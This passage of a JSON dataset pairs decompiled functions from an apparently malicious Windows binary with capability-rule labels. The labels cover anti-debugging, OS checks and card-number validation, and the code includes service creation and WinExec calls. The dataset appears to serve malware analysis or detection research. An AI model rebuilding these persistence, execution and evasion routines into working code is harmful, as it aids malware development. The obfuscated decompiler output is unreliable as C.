    "00404480": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\nint64_t fcn.00404480(void)\n\n{\n    uint32_t extraout_EDX;\n    uint lpVersionInformation;\n    int32_t var_90h;\n    int32_t var_8ch;\n    \n    (*_sym.imp.KERNEL32.dll_GetVersionExA)();\n    if (var_90h == 5) {\n        return CONCAT44(extraout_EDX, 1);\n    }\n    if ((var_90h == 6) && (var_8ch == 0)) {\n        return CONCAT44(extraout_EDX, 1);\n    }\n    return extraout_EDX << 0x20;\n}\n",
        "token_count": 136
    },
    "00402470": {
        "rules": [
            "PEB access/35f28d23090149119036cdb16976bf66"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x004025a9)\n\nint32_t __cdecl\nfcn.00402470(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, int32_t arg_20h)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t extraout_ECX;\n    int32_t unaff_EDI;\n    uint *puVar3;\n    uint8_t in_AF;\n    float10 in_ST0;\n    uchar var_10ch;\n    uint var_10bh;\n    uint var_8h;\n    uint var_4h;\n    \n    if ((-1 < &var_10ch) && (-1 >= &var_10ch)) {\n        *(unaff_EDI + 0x1c) = in_ST0;\n    }\n    fcn.004030c0(arg_18h, arg_1ch, arg_8h, 0x20, arg_20h + 0x20);\n    fcn.004030c0(arg_18h, arg_1ch, arg_ch, 0x20, arg_20h + 0x60);\n    fcn.004030c0(arg_18h, arg_1ch, arg_10h, 0x20, arg_20h + 0xa0);\n    fcn.004030c0(arg_18h, arg_1ch, arg_14h, 0x20, arg_20h + 0xe0);\n    uVar1 = fcn.00402420();\n    if (uVar1 != 0xffffffff) {\n        while( true ) {\n            *(arg_20h + 0x120) = uVar1;\ncode_r0x00402587:\n            var_10ch = 0;\n            puVar3 = &var_10bh;\n            for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n                *puVar3 = 0;\n                puVar3 = puVar3 + 1;\n            }\n            *puVar3 = 0;\n            var_4h = 0x104;\n            *(puVar3 + 2) = 0;\n            iVar2 = fcn.00403880(0x80000001, 0x41125c, 0x411288, &var_8h, &var_10ch, &var_4h);\n            if (iVar2 == 0) break;\n            if ((iVar2 < 1) || (0 < iVar2)) {\n                iVar2 = (*_sym.imp.MSVCRT.dll__stricmp)(&var_10ch, 0x4112d8);\n                if (iVar2 != 0) {\n                    return iVar2;\n                }\n                *(arg_20h + 0x120) = *(arg_20h + 0x120) | 0x80;\n                return 0;\n            }\n            in_AF = 9 < (iVar2 & 0xf) | in_AF;\n            uVar1 = iVar2 + in_AF * '\\x06' & 0xff0f;\n            if (extraout_ECX != 0) {\n                do {\n    // WARNING: Do nothing block with infinite loop\n                } while( true );\n            }\n        }\n        return 0;\n    }\n    iVar2 = (*_sym.imp.MSVCRT.dll_rand)();\n    *(arg_20h + 0x120) = iVar2 % 5;\n    goto code_r0x00402587;\n}\n",
        "token_count": 795
    },
    "00403030": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nbool fcn.00403030(void)\n\n{\n    int32_t iVar1;\n    uint var_10ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_4h = 0x104;\n    iVar1 = fcn.00403880(0x80000002, 0x4112f4, 0x411334, &var_8h, &var_10ch, &var_4h);\n    if (iVar1 == 0) {\n        return false;\n    }\n    iVar1 = (*_sym.imp.MSVCRT.dll__access)(*0x10 + -0x110, 0);\n    return iVar1 != -1;\n}\n",
        "token_count": 153
    },
    "00403830": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00403830(uint arg_8h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.MSVCRT.dll__access)(arg_8h, 0);\n    if (iVar1 != -1) {\n        return 0;\n    }\n    return 1;\n}\n",
        "token_count": 72
    },
    "004047f0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00404a99) overlaps instruction at (ram,0x00404a95)\n// \n\nint32_t fcn.004047f0(void)\n\n{\n    char **ppcVar1;\n    ushort uVar2;\n    int32_t iVar3;\n    uint uVar4;\n    char *pcVar5;\n    char extraout_CL;\n    char cVar6;\n    char *extraout_ECX;\n    int32_t extraout_ECX_00;\n    char extraout_DL;\n    uint8_t extraout_DH;\n    uint8_t extraout_DH_00;\n    uint8_t uVar7;\n    uint unaff_EBX;\n    uint *puVar8;\n    uint *unaff_EBP;\n    uint *puVar9;\n    uint arg_8h;\n    uint32_t unaff_EDI;\n    int32_t *piVar10;\n    ushort in_SS;\n    uchar uVar11;\n    bool bVar12;\n    bool bVar13;\n    ulong uVar14;\n    int32_t *hSCManager;\n    uint in_stack_ffffa193;\n    uint uVar15;\n    \n    cVar6 = unaff_EBX >> 8;\n    iVar3 = fcn.00402ce0(0x411014);\n    if (iVar3 == -1) {\n        return 0;\n    }\n    if ((iVar3 != -1) || (iVar3 == -1)) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)();\n        iVar3 = 1;\ncode_r0x00404818:\n        *(iVar3 + 2) = *(iVar3 + 2) + cVar6;\n        return iVar3 + 1;\n    }\n    piVar10 = unaff_EDI ^ *(unaff_EDI + 0xe58be73);\n    cVar6 = unaff_EBP + 0x15ff5076 >> 8;\n    if (piVar10 != NULL) goto code_r0x00404818;\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)();\n    (*_sym.imp.MSVCRT.dll_sprintf)();\n    fcn.00402390(unaff_EBP + -1, unaff_EBP + -2);\n    uVar15 = unaff_EBP[3];\n    arg_8h = unaff_EBP[2];\n    iVar3 = fcn.00402b60(arg_8h, uVar15, unaff_EBP[4], unaff_EBP[5], unaff_EBP[-1], unaff_EBP[-2]);\n    if (iVar3 == 0) {\n        return 0;\n    }\n    *0x4224b8 = fcn.00403030();\n    iVar3 = fcn.004033b0();\n    if (iVar3 == 0) {\n        return 0;\n    }\n    cVar6 = extraout_CL + -1;\n    bVar12 = (POPCOUNT(cVar6) & 1U) == 0;\n    puVar9 = unaff_EBP;\n    if ((cVar6 != '\\0') && (cVar6 == '\\0')) {\n        puVar8 = &stack0xfffffff2;\n        puVar9 = &stack0xfffffff2;\n        cVar6 = '\\x10';\n        do {\n            unaff_EBP = unaff_EBP + -1;\n            puVar8 = puVar8 + -1;\n            *puVar8 = *unaff_EBP;\n            cVar6 = cVar6 + -1;\n        } while ('\\0' < cVar6);\n    }\n    uVar2 = fcn.00404c70();\n    if ((!bVar12) && (bVar12)) {\n        arg_8h = 0x34a96cf4;\n        puVar9 = *0x6817b43a;\n        piVar10 = 0x1;\n        pe_dos_header = in(uVar2);\n        *extraout_ECX = *extraout_ECX + extraout_DL + '\\x01';\n    }\n    iVar3 = fcn.004031e0(in_stack_ffffa193);\n    if (iVar3 == -1) {\n        iVar3 = fcn.004031e0(0x411060);\n        if (iVar3 == -1) goto code_r0x00404a1a;\n        piVar10 = 0xf;\n    }\n    else {\n        piVar10 = 0xe;\n    }\n    iVar3 = fcn.00404450(arg_8h);\n    if (iVar3 != 0) {\n        fcn.00401080(piVar10);\n        fcn.00403870(piVar10);\n        return 1;\n    }\n    if (*0x4224b8 == 0) {\n        return 0;\n    }\ncode_r0x00404a1a:\n    uVar14 = fcn.004012c0(arg_8h, puVar9 + -0x44);\n    uVar4 = uVar14 >> 0x20;\n    if (uVar14 == 0) {\n        puVar9[-3] = 0;\n    }\n    if (puVar9[-3] != 0) {\n        uVar14 = fcn.00404b30(arg_8h);\n        uVar4 = uVar14 >> 0x20;\n        if (uVar14 == 0) {\n            puVar9[-3] = 0;\n        }\n    }\n    while( true ) {\n        uVar7 = uVar4 >> 8;\n        if (puVar9[-3] == 0) {\n            uVar4 = fcn.00402e90(arg_8h, 0);\n            puVar9[-3] = uVar4;\n            uVar7 = extraout_DH;\n        }\n        if (puVar9[-3] != 0) {\n            fcn.00403870(0xffffffff);\n            uVar7 = extraout_DH_00;\n        }\n        bVar12 = uVar7 < 0x36;\n        bVar13 = (POPCOUNT(uVar7 - 0x36) & 1U) == 0;\n        uVar4 = 1000;\n        (*_sym.imp.KERNEL32.dll_Sleep)(1000);\n        if ((bVar13) || (!bVar13)) goto code_r0x00404b12;\n        ppcVar1 = segment(in_SS, *0x10 + -0x5e6d);\n        pcVar5 = *ppcVar1;\n        uVar4 = 0xb7bc9ea5;\n        if (bVar12) break;\n        if (!bVar13) {\n            uVar4 = 0xb7bc9ea5;\ncode_r0x00404b12:\n            (*_sym.imp.KERNEL32.dll_WinExec)(0x411080, 0, uVar4);\n            return puVar9[-3];\n        }\n        *pcVar5 = *pcVar5 + pcVar5;\n    }\n    uVar11 = uVar15 >> 8 < 0x9e;\n    cVar6 = piVar10 == 1;\n    hSCManager = piVar10;\n    do {\n        puVar9 = (*_sym.imp.ADVAPI32.dll_OpenSCManagerA)(0, 0, 0xf003f, hSCManager, arg_8h, uVar15);\n        if ((uVar11) || (!uVar11)) break;\n    } while (extraout_ECX_00 != 1 && cVar6 != '\\0');\n    uVar15 = *puVar9;\n    *piVar10 = puVar9 + 1;\n    *(*0x9750e2b5 + 0x56) = *(*0x9750e2b5 + 0x56) | uVar15 >> 0x1f;\n    iVar3 = fcn.00402640(hSCManager, arg_8h);\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(0x8bb8ec44);\n    return iVar3;\n}\n",
        "token_count": 1767
    },
    "00402750": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nbool __cdecl fcn.00402750(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint arg_8h_00;\n    char cVar1;\n    code *pcVar2;\n    uint uVar3;\n    uint arg_ch_00;\n    uint arg_ch_01;\n    int32_t iVar4;\n    uint8_t in_DL;\n    uint *puVar5;\n    uchar *puVar6;\n    uint *puVar7;\n    bool bVar8;\n    uint uStack812;\n    uint var_314h;\n    uint var_210h;\n    uint var_10bh;\n    uint var_8h;\n    uint var_4h;\n    \n    puVar5 = &stack0xfffffffc;\n    var_8h = 0;\n    puVar7 = &var_10bh;\n    for (iVar4 = 0x40; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    *(puVar7 + 2) = 0;\n    bVar8 = (in_DL & 0x66) == 0;\n    fcn.004037e0();\n    puVar6 = &stack0xfffffffc;\n    if ((!bVar8) && (puVar6 = &stack0xfffffffc,  bVar8)) {\n        puVar7 = &stack0xfffffcd8;\n        puVar6 = &stack0xfffffcd8;\n        cVar1 = '\\x10';\n        do {\n            puVar5 = puVar5 + -1;\n            puVar7 = puVar7 + -1;\n            *puVar7 = *puVar5;\n            cVar1 = cVar1 + -1;\n        } while ('\\0' < cVar1);\n    }\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)(puVar6 + -0x10c, 0x104);\n    *(puVar6 + -4) = 0;\n    do {\n        uVar3 = fcn.00404b90();\n        arg_ch_00 = fcn.00404b90();\n        arg_ch_01 = fcn.00404b90();\n        arg_8h_00 = *(puVar6 + 0x10);\n        fcn.004043e0(arg_8h_00, uVar3);\n        uVar3 = *(puVar6 + 8);\n        fcn.004043e0(uVar3, arg_ch_00);\n        fcn.004043e0(*(puVar6 + 0xc), arg_ch_01);\n        pcVar2 = _sym.imp.MSVCRT.dll_sprintf;\n        (*_sym.imp.MSVCRT.dll_sprintf)(puVar6 + -0x314, 0x411028, puVar6 + -0x10c, arg_8h_00);\n        iVar4 = fcn.00403830(puVar6 + -0x314);\n        if (iVar4 != 0) {\n            (*pcVar2)(puVar6 + -0x210, 0x411034, puVar6 + -0x10c, uVar3);\n            iVar4 = fcn.00403830(puVar6 + -0x210);\n            if (iVar4 != 0) {\n                (*pcVar2)(puVar6 + -0x210, 0x411034, puVar6 + -0x10c, *(puVar6 + 0xc));\n                iVar4 = fcn.00403830(puVar6 + -0x210);\n                if (iVar4 != 0) {\n                    iVar4 = 1;\n                    goto code_r0x00402883;\n                }\n            }\n        }\n        iVar4 = *(puVar6 + -4);\n        *(puVar6 + -4) = iVar4 + 1;\n    } while (iVar4 + 1 < 3);\n    iVar4 = *(puVar6 + -8);\ncode_r0x00402883:\n    fcn.004043e0(*(puVar6 + 0x14), 4);\n    return iVar4 != 0;\n}\n",
        "token_count": 937
    },
    "00401000": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00401014) overlaps instruction at (ram,0x00401013)\n// \n\nuint __cdecl fcn.00401000(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    uint8_t *unaff_EBX;\n    \n    // [00] -r-x section size 20480 named .text\n    *unaff_EBX = *unaff_EBX & 0xc3;\n    iVar1 = (*_sym.imp.ADVAPI32.dll_CreateServiceA)(arg_8h, arg_ch, arg_ch, 0xf01ff, 1, 0, 1);\n    if (iVar1 != 0) {\n        (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(iVar1);\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 191
    },
    "null": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "",
        "token_count": 0
    },
    "00401cc0": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00401cf5) overlaps instruction at (ram,0x00401cf1)\n// \n\nvoid fcn.00401cc0(void)\n\n{\n    char cVar1;\n    uint8_t extraout_AH;\n    uint16_t extraout_CX;\n    int32_t *piVar2;\n    uint unaff_EBX;\n    uint *puVar3;\n    uint *unaff_EBP;\n    uint *puVar4;\n    int32_t unaff_EDI;\n    bool bVar5;\n    unkbyte10 extraout_ST0;\n    float10 fVar6;\n    ulong uVar7;\n    \n    uVar7 = int.00401f30(0x411494, 0x11, 0x411390, 0x20);\n    piVar2 = uVar7 >> 0x20;\n    *(uVar7 + -0x7ce92414) = extraout_ST0;\n    *piVar2 = *piVar2 + 0x266adf84;\n    int.00401f30(0x411494, 0x11, 0x4113b0, unaff_EBX);\n    int.00401f30(0x411494, 0x11, 0x4113d8, 8);\n    int.00401f30(0x411494, 0x11, 0x4113e0, 0x19);\n    int.00401f30(0x411494, 0x11, 0x4113fc, 0xb);\n    bVar5 = (unaff_EBX & extraout_CX) == 0;\n    int.00401f30(0x411494, 0x11, 0x411408, 0x12);\n    puVar4 = unaff_EBP;\n    if ((!bVar5) && (bVar5)) {\n        puVar3 = &stack0xffffffdc;\n        puVar4 = &stack0xffffffdc;\n        cVar1 = '\\x10';\n        do {\n            unaff_EBP = unaff_EBP + -1;\n            puVar3 = puVar3 + -1;\n            *puVar3 = *unaff_EBP;\n            cVar1 = cVar1 + -1;\n        } while ('\\0' < cVar1);\n    }\n    int.00401f30(0x411494, 0x11, 0x41141c, 0x12);\n    int.00401f30(0x411494, 0x11, 0x411430, 2);\n    bVar5 = false;\n    fVar6 = int.00401f30(0x411494, 0x11, 0x411434, 8);\n    if ((!bVar5) && (bVar5)) {\n        *(unaff_EDI + 0x1c) = fVar6;\n    }\n    int.00401f30(0x411494, 0x11, 0x41143c, 8);\n    int.00401f30(0x411494, 0x11, 0x411444, 6);\n    bVar5 = ((unaff_EBX & 0xff00 | unaff_EBX | extraout_AH) & 0x94f) == 0;\n    int.00401f30(0x411494, 0x11, 0x41144c, 7);\n    if ((!bVar5) && (bVar5)) {\n        puVar3 = &stack0xffffffdc;\n        cVar1 = '\\x10';\n        do {\n            puVar4 = puVar4 + -1;\n            puVar3 = puVar3 + -1;\n            *puVar3 = *puVar4;\n            cVar1 = cVar1 + -1;\n        } while ('\\0' < cVar1);\n    }\n    int.00401f30(0x411494, 0x11, 0x411454, 7);\n    int.00401f30(0x411494, 0x11, 0x41145c, 6);\n    int.00401f30(0x411494, 0x11, 0x411464, 0x25);\n    int.00401f30(0x411494, 0x11, 0x41148c, 8);\n    return;\n}\n",
        "token_count": 979
    },
    "00402140": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004022aa) overlaps instruction at (ram,0x004022a9)\n// \n// WARNING: Removing unreachable block (ram,0x004021b3)\n// WARNING: Removing unreachable block (ram,0x0040222b)\n\nulong __fastcall fcn.00402140(int32_t param_1, uint param_2, int32_t *param_3)\n\n{\n    uint32_t *puVar1;\n    uint8_t *puVar2;\n    int32_t *piVar3;\n    char **ppcVar4;\n    uint32_t uVar5;\n    uint8_t uVar6;\n    char cVar7;\n    uint8_t uVar8;\n    uint16_t uVar9;\n    uint32_t in_EAX;\n    uint uVar11;\n    char *pcVar12;\n    uint8_t uVar13;\n    int32_t *piVar14;\n    uint8_t uVar15;\n    uint16_t unaff_BX;\n    uint32_t uVar16;\n    uint *puVar17;\n    uint *puVar18;\n    uint *puVar19;\n    ushort unaff_SI;\n    uchar *puVar20;\n    uchar *puVar21;\n    uint32_t unaff_EDI;\n    ushort in_SS;\n    bool bVar22;\n    bool bVar23;\n    uint8_t in_AF;\n    bool bVar24;\n    bool bVar25;\n    unkbyte10 in_ST0;\n    float10 in_ST1;\n    float10 in_ST2;\n    float10 in_ST3;\n    float10 in_ST4;\n    float10 in_ST5;\n    float10 in_ST6;\n    float10 in_ST7;\n    ushort uStack20;\n    ushort uStack18;\n    uint16_t uStack16;\n    uint32_t uVar10;\n    \n    puVar17 = &stack0xfffffffc;\n    uVar13 = param_1 >> 8;\n    uVar15 = unaff_BX;\n    *param_3 = 0xf9;\n    if ((uVar13 != uVar15) && (uVar13 == uVar15)) {\n        do {\n    // WARNING: Do nothing block with infinite loop\n        } while( true );\n    }\n    *(param_3 + 1) = 0xd2;\n    bVar22 = (POPCOUNT(uVar13 ^ uVar15) & 1U) != 0;\n    *(param_3 + 2) = 0x47;\n    if (bVar22) {\n        uStack20 = param_1;\n        uStack18 = param_1 >> 0x10;\n        if (!bVar22) goto code_r0x00402181;\n    }\n    *(param_3 + 3) = 0x58;\n    uStack20 = param_2;\n    uStack18 = param_2 >> 0x10;\ncode_r0x00402181:\n    puVar20 = param_3 + 0x46;\n    uVar16 = unaff_BX + *(in_EAX + 0x52);\n    bVar22 = (in_EAX & 0x11cb) == 0;\n    piVar14 = CONCAT22(uStack18, uStack20);\n    *(param_3 + 0x4a) = 0x84;\n    *(param_3 + 0x4b) = 0xd4;\n    if ((!bVar22) && (bVar22)) {\n        do {\n    // WARNING: Do nothing block with infinite loop\n        } while( true );\n    }\n    *(param_3 + 0x13) = 0x99;\n    uVar15 = param_1;\n    *(param_3 + 0x4d) = 0x9d;\n    if ((uVar15 < '\\x01') || ('\\0' < uVar15)) {\n        *(param_3 + 0x4e) = 0x49;\n    }\n    *(in_EAX + 0x8316dbec) = in_ST0;\n    uStack16 = uVar16;\n    uVar8 = in_EAX - 1;\n    uVar6 = 9 < (uVar8 & 0xf) | in_AF;\n    uVar8 = uVar8 + uVar6 * '\\x06';\n    *piVar14 = *piVar14 + 0x46c6df84;\n    *(param_1 + 0x50) = *(param_1 + 0x50) | uVar15;\n    bVar22 = -1 < ((in_EAX - 1 & 0xff00 |\n                   uVar8 + (0x90 < (uVar8 & 0xf0) | uVar15 < uStack20 | uVar6 * (0xf9 < uVar8)) * '`') ^ uStack16);\n    uVar10 = uVar16 & 0xffff;\n    *(param_3 + 0x4f) = 0xb;\n    if ((bVar22) && (!bVar22)) {\n        puVar20 = param_3 + 0x45;\n        *(unaff_EDI | &stack0xfffffffc) = uVar10;\n        piVar14 = piVar14 & 0xffffff00;\n        uVar10 = uVar10 + (uVar10 >> 8) * 'y';\n        in_SS = unaff_SI;\n    }\n    uVar9 = uVar10;\n    puVar20[10] = 0xaa;\n    uVar5 = (puVar20 | 0x561b) - piVar14;\n    bVar22 = (POPCOUNT(uVar5 & 0xff) & 1U) != 0;\n    *(param_3 + 0xb) = 0x8d;\n    puVar19 = &stack0xfffffffc;\n    if ((uVar5 != 0) && (puVar19 = &stack0xfffffffc,  uVar5 == 0)) {\n        puVar18 = &uStack16;\n        puVar19 = &uStack16;\n        cVar7 = '\\x10';\n        do {\n            puVar17 = puVar17 + -1;\n            puVar18 = puVar18 + -1;\n            *puVar18 = *puVar17;\n            cVar7 = cVar7 + -1;\n        } while ('\\0' < cVar7);\n    }\n    *(param_3 + 3) = 0x54;\n    if ((bVar22) && (!bVar22)) {\ncode_r0x00402278:\n        puVar17 = &uStack16;\n        cVar7 = '\\x1e';\n        do {\n            puVar19 = puVar19 + -1;\n            puVar17 = puVar17 + -1;\n            *puVar17 = *puVar19;\n            cVar7 = cVar7 + -1;\n        } while ('\\0' < cVar7);\n        uVar11 = in(0x78);\n        return CONCAT44(piVar14, uVar11);\n    }\n    *(param_3 + 0xd) = 0x9e;\n    uStack16 = uVar16 & 0xffff;\n    bVar22 = false;\n    uVar13 = uVar13 ^ uVar16 & 0xffff;\n    bVar25 = uVar13 << 8 < 0;\n    bVar24 = uVar13 == 0;\n    bVar23 = (POPCOUNT(uVar13) & 1U) == 0;\n    *(param_3 + 0xe) = 0x12;\n    puVar21 = puVar20;\n    if (bVar24) goto code_r0x004022b5;\n    if (!bVar24) goto code_r0x004022b5;\n    pcVar12 = uVar10 & 0xffffff00 | *0x4bb148d3;\n    while( true ) {\n        uVar9 = pcVar12;\n        puVar21 = puVar20 + 1;\n        out(*puVar20, piVar14);\ncode_r0x004022b5:\n        *(param_3 + 0xf) = 0x2e;\n        if ((!bVar22 && !bVar24) && (uStack16 = puVar21,  bVar22 || bVar24)) {\n            do {\n    // WARNING: Do nothing block with infinite loop\n            } while( true );\n        }\n        *(param_3 + 4) = 0x1e;\n        if ((!bVar25) && (uStack16 = uVar9,  bVar25)) {\n            piVar3 = param_3 + 1;\n            puVar2 = puVar21 + 4;\n            *(param_3 + 7) = in_ST1;\n            param_3 = param_3 + 5;\n            puVar21 = puVar21 + 5;\n            bVar22 = *puVar2 < *piVar3;\n            bVar23 = (POPCOUNT(*puVar2 - *piVar3) & 1U) == 0;\n            in_ST1 = in_ST2;\n            in_ST2 = in_ST3;\n            in_ST3 = in_ST4;\n            in_ST4 = in_ST5;\n            in_ST5 = in_ST6;\n            in_ST6 = in_ST7;\n        }\n        *(param_3 + 0x11) = 0x76;\n        puVar20 = puVar21;\n        if ((!bVar23) && (bVar23)) {\n            puVar20 = *param_3;\n            *param_3 = puVar21;\n            bVar22 = puVar19 < *(puVar19 + 0x5f9dff63);\n            puVar19 = puVar19 - *(puVar19 + 0x5f9dff63);\n            if (puVar19 < 0) {\n                *param_3 = *param_3 + param_1 + bVar22;\n                puVar1 = piVar14 + 0x13;\n                *puVar1 = *puVar1 >> 1 | ((*puVar1 & 1) != 0) << 0x1f;\n                goto code_r0x00402278;\n            }\n            bVar22 = false;\n            bVar23 = (POPCOUNT(puVar20 & 0xff) & 1U) == 0;\n            if (-1 < puVar20) goto code_r0x00402352;\n        }\n        *(param_3 + 0x12) = 0x27;\n        if ((bVar23) || (!bVar23)) break;\n        ppcVar4 = segment(in_SS, *0x10 + -0xc);\n        pcVar12 = *ppcVar4;\n        piVar14 = 0xb7bc9ea5;\n        if (bVar22) goto code_r0x00402344;\n        if (!bVar23) break;\n        *pcVar12 = *pcVar12 + pcVar12;\n        puVar2 = pcVar12 + 0x4bb148d3;\n        uVar13 = pcVar12 >> 8;\n        bVar22 = CARRY1(*puVar2, uVar13);\n        *puVar2 = *puVar2 + uVar13;\n        bVar25 = *puVar2 < '\\0';\n        bVar24 = *puVar2 == 0;\n        bVar23 = (POPCOUNT(*puVar2) & 1U) == 0;\n        uStack16 = uVar9;\n    }\n    *(param_3 + 0x13) = 0x55;\n    *(param_3 + 5) = 0xbc;\n    *(param_3 + 0x15) = 0xa3;\ncode_r0x00402344:\n    uStack16 = piVar14;\ncode_r0x00402352:\n    *(param_3 + 0x16) = 0xcb;\n    puVar17 = puVar19[3];\n    *puVar17 = 0x17;\n    return CONCAT44(piVar14 & 0xffff0000 | uStack16, puVar17);\n}\n",
        "token_count": 2669
    },
    "00402390": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00402390(uint *arg_8h, uint *arg_ch)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uchar var_68h;\n    uint var_67h;\n    uint var_4h;\n    \n    var_4h = 0;\n    var_68h = 0;\n    puVar2 = &var_67h;\n    for (iVar1 = 0x18; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    *(puVar2 + 2) = 0;\n    fcn.00402140(&var_68h, &var_4h);\n    fcn.004026e0(&var_68h, var_4h, 0x407014, 0xa000);\n    *arg_8h = 0x407014;\n    *arg_ch = 0xa000;\n    return;\n}\n",
        "token_count": 236
    },
    "004028a0": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "get common file path"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00402957) overlaps instruction at (ram,0x00402954)\n// \n\nuint fcn.004028a0(uint param_1)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uchar *extraout_ECX;\n    uchar *arg_ch;\n    uchar *puVar3;\n    uint *puVar4;\n    uchar uVar5;\n    uchar uVar6;\n    char cVar7;\n    char cVar8;\n    uchar uStack532;\n    uint uStack531;\n    uchar uStack272;\n    uint uStack271;\n    uchar auStack12 [7];\n    uchar uStack5;\n    \n    puVar3 = &stack0xfffffffc;\n    uStack532 = 0;\n    uStack272 = 0;\n    puVar4 = &uStack531;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar4 = 0;\n        puVar4 = puVar4 + 1;\n    }\n    *puVar4 = 0;\n    *(puVar4 + 2) = 0;\n    puVar4 = &uStack271;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar4 = 0;\n        puVar4 = puVar4 + 1;\n    }\n    *puVar4 = 0;\n    *(puVar4 + 2) = 0;\n    uVar5 = 0;\n    cVar8 = '\\0';\n    cVar7 = '\\0';\n    uVar6 = ((puVar4 + 3U | 0x74e3) & 0x1a8) == 0;\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)(&uStack532, 0x104);\n    iVar2 = (*_sym.imp.MSVCRT.dll_sprintf)(&uStack272, 0x411028, &uStack532, param_1);\n    if ((uVar6 || cVar8 != cVar7) || (!uVar6 && cVar8 == cVar7)) {\n        arg_ch = auStack12;\n    }\n    else {\n        *(iVar2 + -0x72c625aa) = *(iVar2 + -0x72c625aa) ^ extraout_ECX;\n        puVar3 = &uStack5;\n        uVar5 = 0;\n        arg_ch = extraout_ECX;\n    }\n    uVar1 = fcn.00404f10(puVar3 + -4, arg_ch);\n    if ((uVar5) || (!uVar5)) {\n        uVar1 = *(puVar3 + -4);\n    }\n    fcn.004029c0(uVar1);\n    iVar2 = fcn.00405000(puVar3 + -0x10c, 0x411048, *(puVar3 + -4), *(puVar3 + -8));\n    if (iVar2 == 0) {\n        return 0;\n    }\n    fcn.00403530(puVar3 + -0x10c, 0xffffffff);\n    return 1;\n}\n",
        "token_count": 711
    },
    "00402d30": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nchar * __cdecl fcn.00402d30(char *arg_8h, int32_t arg_ch, char *arg_10h, int32_t arg_14h)\n\n{\n    char *pcVar1;\n    int32_t iVar2;\n    char *pcVar3;\n    char *pcVar4;\n    bool bVar5;\n    \n    pcVar1 = arg_8h + (arg_ch - arg_14h);\n    if (arg_14h != 0) {\n        if ((0 < arg_14h) && (arg_14h < 1)) {\n            if (pcVar1 != NULL) {\n                do {\n    // WARNING: Do nothing block with infinite loop\n                } while( true );\n            }\n            pcVar1 = (*_sym.imp.KERNEL32.dll_CreateFileA)(0, 0xc0000000, 1, 0, 3, 0x80, 0);\n            return pcVar1;\n        }\n        for (; arg_8h <= pcVar1; arg_8h = arg_8h + 1) {\n            if (*arg_8h == *arg_10h) {\n                bVar5 = true;\n                iVar2 = arg_14h;\n                pcVar3 = arg_8h;\n                pcVar4 = arg_10h;\n                do {\n                    pcVar4 = pcVar4 + 1;\n                    pcVar3 = pcVar3 + 1;\n                    iVar2 = iVar2 + -1;\n                    if (iVar2 == 0) break;\n                    bVar5 = *pcVar3 == *pcVar4;\n                } while (bVar5);\n                if (bVar5) {\n                    return arg_8h;\n                }\n            }\n        }\n        arg_8h = NULL;\n    }\n    return arg_8h;\n}\n",
        "token_count": 398
    },
    "00402dd0": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
